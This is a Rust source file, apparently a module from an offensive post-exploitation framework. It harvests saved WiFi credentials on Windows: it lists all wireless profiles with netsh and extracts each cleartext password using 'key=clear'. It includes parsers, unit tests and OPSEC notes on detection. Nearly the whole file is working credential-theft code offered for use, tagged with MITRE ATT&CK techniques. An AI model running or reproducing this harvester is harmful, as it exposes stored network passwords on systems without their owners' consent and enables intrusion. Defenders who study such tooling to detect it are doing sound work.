//! WiFi credential harvesting
//!
//! Extracts saved WiFi network names and passwords from Windows systems.
//!
//! ## MITRE ATT&CK
//! - T1040: Network Sniffing (context: stored WiFi credentials)
//! - T1555: Credentials from Password Stores
//!
//! ## Methods
//! - Primary: netsh wlan show profiles (cross-platform concept, Windows-only)
//! - Extraction: netsh wlan show profile name="X" key=clear
//!
//! ## OPSEC
//! - Requires user context with network access
//! - May trigger credential access alerts
//! - netsh execution is logged on most systems

#[allow(unused_imports)]
use common::{CredentialInfo, CredentialOutput, KrakenError};

/// Harvest WiFi credentials from saved networks
#[cfg(windows)]
pub fn harvest() -> Result<CredentialOutput, KrakenError> {
    use std::process::Command;

    // Step 1: Get list of all profiles
    let profiles_output = Command::new("netsh")
        .args(["wlan", "show", "profiles"])
        .output()
        .map_err(|e| KrakenError::Module(format!("netsh profiles failed: {}", e)))?;

    let profiles_text = String::from_utf8_lossy(&profiles_output.stdout);
    let profile_names = parse_profile_names(&profiles_text);

    if profile_names.is_empty() {
        tracing::info!("No WiFi profiles found");
        return Ok(CredentialOutput {
            credentials: Vec::new(),
        });
    }

    let mut credentials = Vec::new();

    // Step 2: For each profile, extract details including password
    for name in profile_names {
        let detail_output = Command::new("netsh")
            .args([
                "wlan",
                "show",
                "profile",
                &format!("name={}", name),
                "key=clear",
            ])
            .output()
            .map_err(|e| {
                KrakenError::Module(format!("netsh profile detail failed: {}", e))
            })?;

        let detail_text = String::from_utf8_lossy(&detail_output.stdout);
        let password = parse_key_content(&detail_text).unwrap_or_default();
        let auth_type = parse_authentication(&detail_text).unwrap_or_default();

        credentials.push(CredentialInfo {
            credential_type: "wifi".to_string(),
            domain: auth_type,
            username: name,
            data: if password.is_empty() {
                "[no password]".to_string()
            } else {
                password
            },
            source: "WiFi".to_string(),
        });
    }

    if credentials.is_empty() {
        tracing::info!("No WiFi credentials extracted");
    }

    Ok(CredentialOutput { credentials })
}

/// Parse profile names from netsh wlan show profiles output
#[cfg(any(windows, test))]
fn parse_profile_names(text: &str) -> Vec<String> {
    // Format: "    All User Profile     : NetworkName"
    // or:     "    User Profile         : NetworkName"
    text.lines()
        .filter_map(|line| {
            if line.contains("All User Profile") || line.contains("User Profile") {
                line.split(':').nth(1).map(|s| {
                    s.trim()
                        .trim_matches(char::is_whitespace)
                        .to_string()
                })
            } else {
                None
            }
        })
        .filter(|s| !s.is_empty())
        .collect()
}

/// Parse password from "Key Content" line in netsh wlan show profile output
#[cfg(any(windows, test))]
fn parse_key_content(text: &str) -> Option<String> {
    // Format: "    Key Content            : password123"
    text.lines()
        .find(|line| line.contains("Key Content"))?
        .split(':')
        .nth(1)
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

/// Parse authentication type from netsh wlan show profile output
#[cfg(any(windows, test))]
fn parse_authentication(text: &str) -> Option<String> {
    // Format: "    Authentication         : WPA2-Personal" or similar
    text.lines()
        .find(|line| line.contains("Authentication"))?
        .split(':')
        .nth(1)
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

#[cfg(not(windows))]
pub fn harvest() -> Result<CredentialOutput, KrakenError> {
    Err(KrakenError::Module(
        "WiFi harvesting only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_harvest_unsupported_platform() {
        let result = harvest();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }

    #[test]
    fn test_parse_profile_names_single() {
        let output = r#"Interface : Wi-Fi (implements 802.11):

    All User Profile     : MyNetwork
    All User Profile     : Guest_Network
"#;
        let names = parse_profile_names(output);
        assert_eq!(names.len(), 2);
        assert!(names.contains(&"MyNetwork".to_string()));
        assert!(names.contains(&"Guest_Network".to_string()));
    }

    #[test]
    fn test_parse_profile_names_empty() {
        let output = "Interface : Wi-Fi (implements 802.11):\n";
        let names = parse_profile_names(output);
        assert_eq!(names.len(), 0);
    }

    #[test]
    fn test_parse_profile_names_with_spaces() {
        let output = r#"    All User Profile     : Network With Spaces
    All User Profile     : Another One
"#;
        let names = parse_profile_names(output);
        assert_eq!(names.len(), 2);
        assert!(names.contains(&"Network With Spaces".to_string()));
        assert!(names.contains(&"Another One".to_string()));
    }

    #[test]
    fn test_parse_key_content_present() {
        let output = r#"Profile information for interface "Wi-Fi":
    Protocol            : 802.11n
    Key Content         : SuperSecret123Password
    Authentication      : WPA2-Personal
"#;
        let password = parse_key_content(output);
        assert_eq!(password, Some("SuperSecret123Password".to_string()));
    }

    #[test]
    fn test_parse_key_content_missing() {
        let output = r#"Profile information for interface "Wi-Fi":
    Protocol            : 802.11n
    Authentication      : Open
"#;
        let password = parse_key_content(output);
        assert_eq!(password, None);
    }

    #[test]
    fn test_parse_key_content_empty_value() {
        let output = r#"    Key Content            :
"#;
        let password = parse_key_content(output);
        assert_eq!(password, None);
    }

    #[test]
    fn test_parse_key_content_with_special_chars() {
        let output = r#"    Key Content            : P@ssw0rd!#$%^&*()"#;
        let password = parse_key_content(output);
        assert_eq!(password, Some("P@ssw0rd!#$%^&*()".to_string()));
    }

    #[test]
    fn test_parse_authentication_present() {
        let output = r#"Profile information for interface "Wi-Fi":
    Interface name      : Wi-Fi
    Authentication      : WPA2-Personal
    Encryption          : CCMP
"#;
        let auth = parse_authentication(output);
        assert_eq!(auth, Some("WPA2-Personal".to_string()));
    }

    #[test]
    fn test_parse_authentication_missing() {
        let output = r#"Profile information for interface "Wi-Fi":
    Interface name      : Wi-Fi
    Encryption          : CCMP
"#;
        let auth = parse_authentication(output);
        assert_eq!(auth, None);
    }

    #[test]
    fn test_parse_authentication_open_network() {
        let output = r#"    Authentication         : Open
"#;
        let auth = parse_authentication(output);
        assert_eq!(auth, Some("Open".to_string()));
    }

    #[test]
    fn test_parse_authentication_wpa3() {
        let output = r#"    Authentication         : WPA3-Personal
"#;
        let auth = parse_authentication(output);
        assert_eq!(auth, Some("WPA3-Personal".to_string()));
    }

    #[test]
    fn test_full_realistic_profile_parsing() {
        let profile_output = r#"    Interface name      : Wi-Fi
    Profile name        : CorporateWiFi
    Applied connection security settings : WPA2-Personal

    Key Content         : MySecurePassword123
    Authentication         : WPA2-Personal
    Encryption         : CCMP (AES)
"#;
        assert_eq!(
            parse_key_content(profile_output),
            Some("MySecurePassword123".to_string())
        );
        assert_eq!(
            parse_authentication(profile_output),
            Some("WPA2-Personal".to_string())
        );
    }
}
